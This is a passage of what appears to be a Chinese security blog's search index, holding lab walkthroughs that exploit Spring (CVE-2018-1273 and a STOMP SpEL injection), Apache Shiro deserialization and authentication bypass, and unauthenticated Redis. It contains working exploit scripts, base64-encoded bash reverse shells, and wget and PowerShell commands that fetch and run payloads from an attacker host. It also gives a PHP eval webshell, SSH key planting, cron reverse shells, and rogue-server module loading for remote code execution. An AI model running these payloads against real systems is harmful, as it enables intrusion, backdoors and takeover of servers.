success.\")\n\n    def __del__(self):\n        self.session.close()\n\n\nsockjs = SockJS('http://your-ip:8080/gs-guide-websocket')\nsockjs.start()\ntime.sleep(1)\n\nsockjs.send('connect', {\n    'accept-version': '1.1,1.0',\n    'heart-beat': '10000,10000'\n})\nsockjs.send('subscribe', {\n    'selector': \"T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')\",\n    'id': 'sub-0',\n    'destination': '/topic/greetings'\n})\n\ndata = json.dumps({'name': 'vulhub'})\nsockjs.send('send', {\n    'content-length': len(data),\n    'destination': '/app/hello'\n}, data)\n\n```\n\n然后我们这里要进行修改 所以Poc并不通用\n\n\n\n![image-20210522093127253](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093127253.png)\n\n\n\n一个是被攻击的IP\n\n一个是执行的命令\n\n一个是名字\n\n进行修改后\n\n\n\n![image-20210522093214720](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093214720.png)\n\n\n\n进行执行\n\n![image-20210522093250917](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093250917.png)\n\n\n\n去docker底层查看执行是否成功\n\n\n\n![image-20210522093404508](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093404508.png)\n\n\n\n#### Poc-2-反弹shell\n\n\n\n```\n#!/usr/bin/env python3\nimport requests\nimport random\nimport string\nimport time\nimport threading\nimport logging\nimport sys\nimport json\n\nlogging.basicConfig(stream=sys.stdout, level=logging.INFO)\n\ndef random_str(length):\n    letters = string.ascii_lowercase + string.digits\n    return ''.join(random.choice(letters) for c in range(length))\n\n\nclass SockJS(threading.Thread):\n    def __init__(self, url, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'\n        self.daemon = True\n        self.session = requests.session()\n        self.session.headers = {\n            'Referer': url,\n            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'\n        }\n        self.t = int(time.time()*1000)\n\n    def run(self):\n        url = f'{self.base}/htmlfile?c=_jp.vulhub'\n        response = self.session.get(url, stream=True)\n        for line in response.iter_lines():\n            time.sleep(0.5)\n    \n    def send(self, command, headers, body=''):\n        data = [command.upper(), '\\n']\n\n        data.append('\\n'.join([f'{k}:{v}' for k, v in headers.items()]))\n        \n        data.append('\\n\\n')\n        data.append(body)\n        data.append('\\x00')\n        data = json.dumps([''.join(data)])\n\n        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)\n        if response.status_code != 204:\n            logging.info(f\"send '{command}' data error.\")\n        else:\n            logging.info(f\"send '{command}' data success.\")\n\n    def __del__(self):\n        self.session.close()\n\n\nsockjs = SockJS('http://192.168.253.7:8080/gs-guide-websocket')\nsockjs.start()\ntime.sleep(1)\n\nsockjs.send('connect', {\n    'accept-version': '1.1,1.0',\n    'heart-beat': '10000,10000'\n})\nsockjs.send('subscribe', {\n    'selector': \"T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1My42NS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}')\",\n    'id': 'sub-0',\n    'destination': '/topic/greetings'\n})\n\ndata = json.dumps({'name': 'vulhub'})\nsockjs.send('send', {\n    'content-length': len(data),\n    'destination': '/app/hello'\n}, data)\n\n```\n\n\n\n同样也是需要修改的\n\n上java编码的网站\n\n```\nhttp://www.jackson-t.ca/runtime-exec-payloads.html\n```\n\n\n\n![image-20210521085321594](file://C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085321594.png?lastModify=1621647316)\n\n\n\n```\nbash -i >& /dev/tcp/192.168.175.130/8888 0>&1\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\n```\n\n\n\n进行修改\n\n\n\n![image-20210522093745956](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093745956.png)\n\n\n\n执行poc\n\n\n\n![image-20210522093816453](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093816453.png)\n\n\n\n成功拿到反弹shell\n\n\n\n![image-20210522093836061](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093836061.png)\n\n\n\n### Spring Data Commons远程命令执行漏洞(CVE-2018-1273)\n\n#### 影响版本\n\n```\nSpring Data Commons 1.13~1.13.10(Ingalls SR10)\nSpring Data REST 2.6~2.6.10(Ingalls SR10)\nSpring Data Commons 2.0~2.0.5(Kay SR5)\nSpring Data Rest 3.0~3.0 5(Kay SR5)\n较旧的不受支持的版本也会受到影响\n```\n\n#### 漏洞搭建\n\n```\ncd vulhub-master/spring/CVE-2018-1273\nsudo docker-compose up -d\n```\n\n\n\n![image-20210522094338512](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522094338512.png)\n\n\n\n#### 漏洞复现\n\n\n\n访问\n\n```\nhttp://192.168.175.209:8080/users\n```\n\n\n\n\n\n![image-20210522094409667](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522094409667.png)\n\n\n\n\n\n#### 漏洞验证\n\n进行抓包\n\n\n\n![image-20210522094709560](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522094709560.png)\n\n\n\n#### Poc\n\n```\nPOST /users?page=&size=5 HTTP/1.1\nHost: 192.168.175.209:8080\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 121\nOrigin: http://192.168.175.209:8080\nConnection: close\nReferer: http://192.168.175.209:8080/users\nUpgrade-Insecure-Requests: 1\n\nusername[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"touch /tmp/a001\")]=&password=&repeatedPassword=\n```\n\n\n\n\n\n![image-20210522094845931](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522094845931.png)\n\n\n\n执行之后呢 我们可以去docker底层看一下\n\n\n\n![image-20210522094958191](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522094958191.png)\n\n\n\n\n\n#### Poc-2-反弹shell\n\n\n\nbash反弹一句话\n\n\n\n\n\n![image-20210522095153542](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522095153542.png)\n\n\n\n\n\npython开启http服务\n\n\n\n![image-20210522095232922](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522095232922.png)\n\n\n\n\n\n上传sh脚本\n\n\n\n```\n/usr/bin/wget -qO /tmp/a002 http://192.168.175.130:9999/shell.sh\n```\n\n进行执行\n\n\n\n![image-20210522095354596](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522095354596.png)\n\n\n\n然后继续去docker底层看一下\n\n\n\n可以看到成功写入\n\n\n\n![image-20210522095552456](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522095552456.png)\n\n\n\n然后进行执行sh脚本\n\n```\n/bin/bash /tmp/a002\n```\n\n\n\n![image-20210522095701465](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522095701465.png)\n\n\n\n成功拿到反弹shell\n\n\n\n![image-20210522095743196](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522095743196.png)","tags":["Spring总结"],"categories":["服务攻防"]},{"title":"Shiro总结","url":"/2021/06/22/shiro/","content":"\n**Shiro**\n\n<!--more-->\n\n# Shrio\n\n## 前言\n\n维基百科：https://zh.wikipedia.org/wiki/Apache_Shiro\n\nApache Shiro 是企业常见的Java安全框架，执行身份验证、授权、密码和会话管理\n\n只要rememberMe的AES加密秘钥泄露，无论shiro是什么版本都会导致反序列化漏洞\n\n## 漏洞原理\n\nApache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。\n在服务端接收cookie值时，按照如下步骤来解析处理：\n\n```\n1、检索RememberMe cookie的值\n2、Base 64解码\n3、使用AES解密（加密密钥硬编码）\n4、进行反序列化操作（未作过滤处理）\n在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。\n```\n\n\n\n## shiro序列化利用条件\n\n由于使用了aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为`kPH+bIxk5D2deZiIxcaaaA==`，这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞\n\n尽管目前已经更新了许多版本，官方并没有反序列化漏洞本身解决，而是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该漏洞。但是，目前一些开源系统、教程范例代码都使用来固定的编码，这里我们可以通过搜索引擎、github等来收集密钥，提高漏洞检测与利用的成功率。\n\n\n\n\n## 本地搭建\n\n### 环境下载\n\n```\nhttps://github.com/apache/shiro/releases/tag/shiro-root-1.2.4\n```\n\n### Tomcat安装\n\n同样是安装java8\n\n\n\n![image-20210515064238245](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064238245.png)\n\n\n\n然后安装Tomcat8\n\n\n\n![image-20210515064306711](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064306711.png)\n\n\n\n### 部署war包\n\n\n\n![image-20210515064357068](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064357068.png)\n\n\n\n### 启动Tomcat8并访问Shiro\n\n\n\n![image-20210515064451479](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064451479.png)\n\n\n\n\n\n![image-20210515064605144](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064605144.png)\n\n\n\n![image-20210515064753752](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064753752.png)\n\n## Linux搭建\n\n使用vulhub \n\n```\ncd vulhub-master/shiro/CVE-2016-4437\nsudo docker-compose up -d\n```\n\n\n\n![image-20210515065236330](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515065236330.png)\n\n\n\n\n\n远程访问一下\n\n\n\n![image-20210515065409681](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515065409681.png)\n\n\n\n\n\n## Linux出网环境渗透Shiro反序列化漏洞\n\n### Apache Shiro 反序列化漏洞 (CVE-2016-4437)\n\n#### 漏洞原理\n\nApache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：\n\n得到rememberMe的cookie值>Base64解码一>AES解密一>反序列化。\n\n然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞\n\n\n\n#### 影响版本\n\nShiro<1.2.5版本\n\n\n\n#### 漏洞复现\n\n进行抓包\n\n\n\n![image-20210515070102340](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515070102340.png)\n\n\n\n## Linux不出网环境渗透Shiro反序列化漏洞\n\n\n\n执行一下py脚本\n\n\n\n![image-20210515071107259](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515071107259.png)\n\n\n\n分析一下这个脚本\n\n\n\n![image-20210515071528001](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515071528001.png)\n\n\n\n可以修改延迟 可以修改默认碰撞的key\n\n\n\n执行一下 看看效果\n\n\n\n### Windows环境\n\n\n\n#### 拿到shell\n\n\n\n![image-20210515071942968](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515071942968.png)\n\n\n\n跑出了加密密钥 + 系统\n\n![image-20210515072513728](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515072513728.png)\n\n\n\n#### 上线CS\n\n\n\n熟练的操作一遍\n\n生成马儿\n\n\n\n![image-20210515073534804](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073534804.png)\n\n\n\n\n\n![image-20210515073556410](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073556410.png)\n\n\n\n\n\n![image-20210515073621654](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073621654.png)\n\n\n\npython开启服务\n\n\n\n![image-20210515073808383](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073808383.png)\n\n\n\n拿到的shell执行powershell一句话\n\n\n\n```\npowershell (new-object System.Net.WebClient).DownloadFile('http://192.168.175.130:8888/a001.exe','a001.exe');start-process a001.exe\n```\n\n\n\n![image-20210515073851831](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073851831.png)\n\n\n\n成功上线\n\n\n\n![image-20210515073929807](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073929807.png)\n\n\n\n可以看到权限事System权限\n\n\n\n### Linux环境\n\n#### 拿到shell\n\n\n\n![image-20210515072628016](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515072628016.png)\n\n\n\n![image-20210515072605647](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515072605647.png)\n\n\n\n#### 上线vps\n\n```\nnc -lvp 8888\nbash -i >& /dev/tcp/IP/8888 0>&1\n```\n\n\n\n\n\n## 内网环境打Shrio\n\n\n\n\n\n\n\n## 自动化武器\n\n\n\n### Shiro反序列化漏洞综合利用工具\n\n\n\n![image-20210515155916974](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515155916974.png)\n\n\n\n### 自动加key回显工具\n\n\n\n![image-20210515160136173](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160136173.png)\n\n\n\n把key复制过去\n\n\n\n![image-20210515160124862](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160124862.png)\n\n\n\n### 命令执行工具-117个key\n\n\n\n![image-20210515160406859](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160406859.png)\n\n\n\n### Shiro550_720漏洞检测工具--Linux好用\n\n\n\n![image-20210515160609251](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160609251.png)\n\n\n\n一般是选择这两个\n\n\n\n![image-20210515160645604](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160645604.png)\n\n\n\n\n\n## Apache shrio权限绕过(CVE-2020-11989)\n\n### 漏洞原理\n\nApache Shiro 1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。\nShiro框架通过拦截器功能来对用户访问权限进行控制，如anon，authc等拦截器。\n\nanon为匿名拦截器，不需要登录即可访问；\n\nauthc为登录拦截器，需要登录才可以访问。\n\nShiro的URL路径表达式为Ant格式，路径通配符表示匹配零个或多个字符串，`/`可以匹配`/hello`，但是匹配不到`/hello/`，因为`*`通配符无法匹配路径。假设`/hello`接口设置了authc拦截器，访问`/hello`会进行权限判断，但如果访问的是`/hello/`，那么将无法正确匹配URL，直接放行，进入到spring拦截器。spring中的`/hello`和`/hello/`形式的URL访问的资源是一样的，从而实现了权限绕过。\n\n\n\n### 影响版本\n\nApache Shiro <1.5.2版本\n\n### 漏洞复现\n\n\n\n```\ndocker pull vulfocus/shiro-cve_2020_1957 #拉取镜像\ndocker images                            #查看开启的ID\ndocker run -d -p 8080:8080 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=192.168.175.130 29136b1d3c61\n```\n\n\n\n![image-20210515162145988](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162145988.png)\n\n\n\n这里是Kali本机的IP\n\n\n\n成功访问\n\n\n\n![image-20210515162348920](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162348920.png)\n\n\n\n进行抓包\n\n\n\n![image-20210515162546262](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162546262.png)\n\n\n\n访问`/hello/1` 接口\n\n\n\n![image-20210515162636567](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162636567.png)\n\n\n\n发生了302跳转\n\n\n\n那么在加一个`/`\n\n\n\n成功绕过\n\n\n\n![image-20210515162718265](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162718265.png)\n\n \n\n### 漏洞比较\n\nCVE-2020-13933虽然是CVE-2020-11989的绕过，然而两者的绕过内容却不同！\n\nCVE-2020-11989：针对于`/admin/page`，这种固定路由，shiro得到的地址为`/`，因此认为可以访问，Spring得到的地址为`/admin/page`，从而定位到未授权的页面！\n\nCVE-2020-13933则是匹配非固定地址路由，比如`/admin/{name}`，因为shiro得到的是`/admin/`，认为可以访问，而Spring得到的是`/admin/;page`，如果也采取固定路由，则会因为找不到`;page`，从而返回404！\n\n\n\n## Apache Shiro 认证绕过漏洞(CVE-2020-1957)\n\n### 漏洞原理\n\n在使用Spring动态控制器时，攻击者通过构造`..;`这样的跳转，可以绕过Shiro中对目录的权限限制。\n\n### 影响版本\n\nApache Shiro<1.5.3","tags":["Shiro总结"],"categories":["服务攻防"]},{"title":"Redis总结","url":"/2021/06/22/Redis/","content":"\n**Redis**\n\n<!--more-->\n\n# Redis\n\n## 0x01 简介\n\nREmote DIctionary Server（Redis）是一个由 Salvatore Sanfilippo写的key-value存储系统。\nRedis是—个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于內存亦可持久化的日志型、Key-Value数据库，并提供多种语言的APl。它通常被称为数据结构服务器，因为值（value）可以是字符串（String），哈希（Map），列表（List），集合（sets）和有序集合（sorted sets）等类型。从2010年3月15日起，Redis的开发工作由 Mware主持。从2013年5月开始，Redis的开发由 Pivotal赞助。目前最新稳定版本为4.0.8\n\nRedis是一个开源的高性能键值数据库。**最热门的NoSq数据库之一**，也被人们称为数据结构服务器。\n\n最大的特点就是 ：快\n\n```\n1.以内存作为数据存储介质，读写数据的效率极高。\n2.储存在 Redis中的数据是持久化的，断电或重启，数据也不会丢失\n3.存储分为内存存储、磁盘存储和log文件。\n4.可以从磁盘重新将数据加载到內存中，也可以通过配置文件对其进行配置，因此，redis才能实现持久化\n5.支持主从模式，可以配置集群，更利于支撑大型的项目。\n```\n\n\n\n最新版是6.2的\n\n\n\nRedis默认端口：6379  sentinel.conf配置器端口为26379\n\n## 0x02 未授权访问\n\n### 未授权访问原理\n\n主要是因为配置不当，导致未授权访问漏洞。\n进一步将恶意数据写入内存或者磁盘之中，造成更大的危害。\n\n配置不当一般主要是两个原理：\n\n- 配置登录策略导致任意机器都可以登录 redis。\n- 未设置密码或者设置弱口令。\n\n这边用Centos7进行演示Redis-3.2.0\n\n官网： [Redis](https://redis.io/) \n\n安装命令也很简单\n\n```c\nwget http://download.redis.io/releases/redis-3.2.0.tar.gz\ntar xzf redis-3.2.0.tar.gz\ncd redis-3.2.0\nmake\n```\n\n编译完成之后呢 简单查看一下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410132230796.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2021041013231055.png)\n这些都是Redis的命令\n\n去修改一下配置文件\n\n因为我们要做未授权访问嘛\n\n```c\nvi redis.conf\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410132504187.png)\n\n\n把这个 bind 127.0.0.1 注释掉\n\n意思是所有机器都可以登录了\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410132653140.png)\n\n设置为no  意思是关闭安全模式\n\nok 设置完成 保存退出\n\n```c\ncp redis.conf ./src/redis.conf  //配置文件复制过去\n\n./src/redis-server redis.conf //开启Redis\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410132837471.png)\n\n检查服务，看看端口 \n\n\n```c\nnetstat -nultp\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410132942898.png)\n\n然后 要本地登录的话\n\n可以设置一下 环境变量 \n\nzsh添加环境变量\n\n```c\nexport PATH=/root/Desktop/redis-3.2.0/src:$PATH\n```\n\n以后启动Redis在命令行就可以开启了\n\n但是 我没设置。。\n\n就要去src目录下\n\n```c\n./redis-cli -h {host} -a {密码} -p {port} {command}\n```\n\n默认是没有密码的\n\n直接登录\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410133516313.png)\n常用命令\n\n```c\n1.查看信息：info\n2.删除所有数据库內容：flushable\n3.刷新数据库：flush\n4.看所有键：KEYS*，使用 select nun可以查看键值数据。\n5.设置变量：set test“who am i\n6.config set dir dirpath设置路径等配置7.config get dir/filename获取路径及数据配置信息\n8.save保存\n9.get变量，查看变量名称\n```\n\n然后呢 我这边用另一台机器Redis-kali-2020.4\n\n进行 Redis未授权访问\n\n这边因为Centos7的网卡 问题  淦\n\n我用两台Redis-kali-2020.4进行未授权测试一下\n\n可以看到 直接就进来了\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410141242112.png)\n\n## 0x03 Redis写入webshell\n\n既然进来了嘛\n\n```c\nconfig set dir /var/www/html/\n//切换目录到网站的根目录\n\nset x \"\\n\\n\\n<?php phpinfo();?>\\n\\n\\n\"\n//写入恶意代码phpinfo()\n\nset xx \"\\n\\n\\n<?php @eval($_POST['1']);?>\\n\\n\\n\"\n//写入一句话木马\n\nconfig set dbfilename a001.php\n//磁盘中生成木马文件a001.php\n\nsave\n//进行保存\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410141551721.png)\n\n可以去靶机看一下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410141803492.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410141838880.png)\n\n可以看到 被成功写入了\n\n检查webshell\n\nkali开启apache2\n\n```c\nvi /etc/apache2/ports.conf\n```\n\n修改默认端口为8080\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410142130349.png)\n保存退出\n\n启动apache2服务\n\n```\n/etc/init.d/apache2 start\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410142316409.png)\n\n进行访问 可以看到是成功的\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2021041014253438.png)\n蚁剑连接\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410142717773.png)\n## 0x04 Redis密钥登录SSH\n\nkali开启ssh服务\n```c\n/etc/init.d/ssh start\n```\n\n设置redis密码\n\n```c\nconfig set requirepass a001\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410143321435.png)\n设置成功后 在进行查看就不可以了\n\n把密码写进去\n\n```c\nauth a001\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410143510244.png)\n\n攻击机kali生成`ssh-rsa`密钥\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410143656351.png)\n\n然后在`.ssh`这个目录下 就生成了这两个文件\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410143940182.png)\n进行导出Key\n\n```c\n(echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") > key.txt\n```\n\n`\\n\\n`是为了防止乱码\n\n\n把生成的key.txt 复制到redis/src的目录下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410145806165.png)\n\n进行写入\n\n```\ncat key.txt | ./redis-cli -h 192.168.175.162 -a a001 -x set xxxx    \n```\n\n进行查看 是成功写入的\n\n\n\n\n切换目录到靶机的`/root/.ssh`目录下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410145016660.png)\n\n设置文件名 并进行导出 最后记得保存\n\n```c\nconfig set dbfilename authorized_keys\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410145109945.png)\n\n进行登录\n\n```c\nssh -i id_rsa root@192.168.175.162\n```\n\n可以看到ssh成功登录\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410150107371.png)\n## 0x05 利用计划任务反弹shell\n- nc开启监听\n\n```c\nnc -lvnp 6666\n```\n\n- 写入一句话\n\n```c\n192.168.175.162:6379> set  xx   \"\\n* * * * * bash -i >& /dev/tcp/192.168.175.161/9999 0>&1\\n\"         #星号代表计划任务执行的时间\nOK\n192.168.175.162:6379> config set dir /var/spool/cron/   #设置导出的路径\nOK\n192.168.175.162:6379> config set dbfilename root  #设置导出的文件名\nOK\n192.168.175.162:6379> save   #保存\nOK\n192.168.175.162:6379> \n```\n或者这样也是可以的\n\n```c\n┌──(root/kali)-[~/桌面/redis-3.2.0/src]\n└─# echo -e \"\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.175.161/9999 0>&1\\n\\n\"|./redis-cli -h 192.168.175.162 -a a001 -x set 1\n./redis-cli -h 192.168.175.162 -a a001 config set dir /var/spool/cron/\n./redis-cli -h 192.168.175.162 -a a001 config set dbfilename root\n./redis-cli -h 192.168.175.162 -a a001 save\nOK\nOK\nOK\nOK\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410154041829.png)\n## 0x06 利用主从复制RCE\n\n之前写入webshell 基本是利用crontab、ssh key、webshe‖这样的文件都有一定容错性，再加上 crontab和ssh服务可以说是服务器的标准的服务，所以在以前，这种通过写入文件的 getshell方式基本就可以说是很通杀了\n\n但随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除 redis以外的任何服务存在，包括sh和 crontab，再加上权限的严格控制，只靠写文件就很难再 getshel了，在这种情况下，我们就需要其他的利用手段了\n\n漏洞存在于4.X、5.X版本中，简单来讲就是\n\n攻击者（主机）写一个so文件，然后通过 FULLRESYNC（全局）同步文件到受害人（从机）上。\n\n下载安装4.0.8的版本\n\n一样的配置 改bind+改no\n\n然后进行启动\n\n```c\n./src/redis-server redis.conf\n```\n\n设置密码\n\n```c\nconfig set requirepass a002\n```\n\n下载两个脚本\n\n```c\nhttps://github.com/n0b0dyCN/redis-rogue-server\n//未授权\nhttps://github.com/Testzero-wz/Awsome-Redis-Rogue-Server\n//Redis有密码\n```\n\n\n目标靶机是不可以开启安全模式的\n\n**远程登录**\n\n攻击机上执行 进行远程连接靶机\n\n\n```c\npython3 redis_rogue_server.py -rhost 192.168.175.162 -lhost 192.168.175.161 -passwd a002\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410185021254.png)\n\n他这里问你\n\ni：直接拿到shell \n\n还是r：反弹shell\n\n上面就是拿shell\n\n下面搞一搞 反弹shell\n\n选r  攻击机的IP +开启监听端口\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2021041019260446.png)\n\npython进去pty\n\n```c\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410192522973.png)\n\n\n\n\n\n## 0x07 本地Redis主从复制RCE反弹shell\n\n**但是 如果目标机器仅仅允许本地进行登录的时候**\n\n这个时候，我们可以通过配合其他漏洞，从目标本地登录 redis。然后手动执行脚本内写死的一些命令\n\n将靶机 Redis作为从机，将攻击机器设置为主机\n\n然后攻击机器会自动将一些恶意so文件同步给目标机器（从机），从而来实现对目标机器的远程命令执行。\n\n\n\n还是用这两个脚本 \n\n```\nhttps://github.com/n0b0dyCN/redis-rogue-server\n//未授权\nhttps://github.com/Testzero-wz/Awsome-Redis-Rogue-Server\n//Redis有密码\n```\n\n但是要说一下 \n\n**将 redis-rogue-server的exp.so文件复制到 Awsome文件夹中使用，因为exp.so带 system模块**\n\n开启监听\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410190803461.png)\n\n\n攻击机开启主服务器\n\n```c\npython3 redis_rogue_server.py -v -path exp.so\n```\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410190812382.png)\n\n然后去靶机上\n\n查看模块 可以看到是没有的可用的模块\n\n```c\nmodule list\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410192740804.png)\n\n```c\nconfig set dir /tmp\n//一般tmp目录都有写权限，所以选择这个目录写入\nconfig set dbfilename exp.so\n//设置导出文件的名字 这里就是创建一个空文件\nslaveof 192.168.175.161 15000\n//进行主从同步，将恶意so文件写入到tmp文件\n//端口可以自定义\n```\n\n然后就可以看到攻击机这边开始了同步\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410192924458.png)\n\n关闭主从同步\n\n```c\nslaveof NO ONE\n```\n\n```c\nmodule load ./exp.so \n//加载写入的so文件模块\nmodule list\n//ັ查看恶意的so文件有没有写入成功\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410194627342.png)\n\n\n执行反弹shell\n\n```c\nsystem.rev 192.168.175.161 9999\n```\n\n\n就是没有回显\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410193233565.png)\n\n然后去攻击机那边进行查看\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410193257516.png)\n\n可以看到已经拿到了\n\npython进入pty\n\n```c\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410193611148.png)\n\n还可以用另外一种方式\n\n直接执行命令\n\n```c\nsystem.exec \"id\"\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410194438216.png)\n\n","tags":["Redis总结"],"categories":["服务攻防"]},{"title":"Nginx总结","url":"/2021/06/22/Nginx/","content":"\n**Nginx**\n\n<!--more-->\n\n# Nginx\n\n## 